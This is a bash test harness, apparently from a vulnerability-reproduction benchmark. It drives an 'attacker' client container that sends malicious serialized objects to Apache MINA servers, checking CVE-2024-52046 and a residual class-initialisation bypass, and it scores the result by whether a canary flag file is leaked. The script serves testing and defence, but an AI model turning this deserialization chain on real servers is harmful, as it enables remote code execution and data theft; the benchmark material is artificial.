#!/usr/bin/env bash
# =====================================================================
# PCBV2-0049 apache-mina-cve-2026-42778  (CVE-2024-52046 -> CVE-2026-42778)
#   seed     (CVE-2024-52046): 外部 TCP client 容器（app/Client.java，docker compose run）
#            以 MINA type-1 序列化流发送 PcbSeed -> 真实 MINA NioSocketAcceptor 服务器
#            getObject() 完整反序列化 -> PcbSeed.readObject() 读 /canary/flag.txt ->
#            服务器回显 "PCB_READOBJECT=<flag>"。
#            V0 (mina-core 2.2.3 无 allowlist) 可达；V1 (2.2.4 allowlist 在 resolveClass)
#            阻断（readObject 不执行，PCB_READOBJECT 为空）。
#   residual (CVE-2026-42778): 同一 client 以 mode=canary 发送 PcbCanary ->
#            readClassDescriptor() 在 allowlist 之前 Class.forName(name,true) 触发
#            静态初始化读 flag（Beacon）-> 类随后被 reject，exceptionCaught 回显
#            "PCB_STATICINIT=<flag>"。V1 可达；V2 (2.2.7 先查 allowlist) 阻断。
#   判定通道: client 进程输出中的 "PCB_READOBJECT=<RUN_FLAG>" / "PCB_STATICINIT=<RUN_FLAG>"
#   退出码:   0=效果发生 10=未发生 20=环境失败 30=参数错误
# =====================================================================
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"

# compose 文件里服务环境用 ${PCB_FLAG:?} 插值，平台约定 flag 即 RUN_FLAG
export PCB_FLAG="$RUN_FLAG"

MODE_ARG="seed"; CHANNEL="PCB_READOBJECT"
if [[ "$MODE" == "--residual" ]]; then MODE_ARG="canary"; CHANNEL="PCB_STATICINIT"; fi

PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-9009}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$PORT" ]] || { echo "ERR: compose port lookup failed for $VERSION" >&2; exit 20; }

# 就绪探测：MINA 服务器 TCP 9009 可连
"$PY" - "$PORT" <<'PYEOF'
import sys, socket, time
port = int(sys.argv[1])
for _ in range(60):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=5)
        s.close(); sys.exit(0)
    except Exception:
        time.sleep(2)
sys.exit(1)
PYEOF
[[ $? -eq 0 ]] || { echo "ERR: mina server $VERSION not reachable on tcp:$PORT" >&2; exit 20; }

# 外部攻击者 client 容器经 docker 网络触发真实 TCP 服务
OUT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile client run --rm --no-deps client sh -c 'java -cp "$(cat /work/cp.txt)" Client '"$VERSION"' 9009 '"$MODE_ARG" 2>&1)"
RC=$?
echo "$OUT" | tail -c 800
if [[ $RC -ne 0 ]]; then echo "ERR: client run rc=$RC" >&2; exit 20; fi
if grep -qF "$CHANNEL=$RUN_FLAG" <<<"$OUT"; then echo "OK: $CHANNEL surfaced"; exit 0; fi
echo "no $CHANNEL=$RUN_FLAG in client output"; exit 10
